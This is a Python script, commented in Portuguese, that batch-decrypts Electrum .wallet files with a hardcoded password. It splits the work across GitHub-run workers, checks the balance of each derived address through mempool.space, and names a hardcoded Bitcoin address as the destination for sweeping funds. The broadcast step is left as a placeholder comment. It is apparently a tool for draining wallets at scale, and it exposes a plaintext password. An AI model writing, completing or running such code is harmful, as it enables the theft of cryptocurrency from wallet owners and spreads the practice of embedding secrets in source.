import json
import base64
import hashlib
import os
import requests
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from bitcoinlib.keys import Key

# --- CONFIGURAÇÕES ---
PASSWORD = "Benjamin2020*1981$"
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"

# Pega variáveis do ambiente do GitHub para dividir o trabalho
worker_id = int(os.environ.get('WORKER_ID', 1))
total_workers = int(os.environ.get('TOTAL_WORKERS', 1))

def decrypt_electrum(encrypted_data, password):
    try:
        data = base64.b64decode(encrypted_data)
        iv = data[:16]
        ct = data[16:]
        key = hashlib.sha256(hashlib.sha256(password.encode()).digest()).digest()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pt[:-pt[-1]].decode('utf-8')
    except: return None

def check_and_sweep(wif):
    try:
        k = Key(wif, network='bitcoin')
        # Testa apenas os 3 formatos mais comuns da Electrum para ganhar tempo
        for wt in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=wt)
            r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=5)
            if r.status_code == 200:
                bal = r.json()['chain_stats']['funded_txo_sum'] - r.json()['chain_stats']['spent_txo_sum']
                if bal > 0:
                    print(f"💰 SUCESSO! Endereço: {addr} | Saldo: {bal}")
                    # Chamar sua função de broadcast aqui
                    return True
    except: pass
    return False

def run():
    # Lista todos os arquivos .wallet
    all_files = sorted([f for f in os.listdir('.') if f.endswith('.wallet')])
    
    # Divide os arquivos entre os Workers
    files_to_process = [all_files[i] for i in range(len(all_files)) if i % total_workers == (worker_id - 1)]
    
    print(f"🚀 Worker {worker_id}/{total_workers} iniciando. Arquivos: {len(files_to_process)}")

    for file_path in files_to_process:
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
                
            # Extração de chaves importadas (keypairs)
            if 'keypairs' in data:
                for pub, enc_priv in data['keypairs'].items():
                    decrypted_wif = decrypt_electrum(enc_priv, PASSWORD)
                    if decrypted_wif:
                        check_and_sweep(decrypted_wif)
            
            # Extração de Master Key (xprv)
            if 'keystore' in data and 'xprv' in data['keystore']:
                xprv = decrypt_electrum(data['keystore']['xprv'], PASSWORD)
                if xprv:
                    check_and_sweep(xprv)
                    
        except Exception as e:
            print(f"Erro no arquivo {file_path}: {e}")

if __name__ == "__main__":
    run()
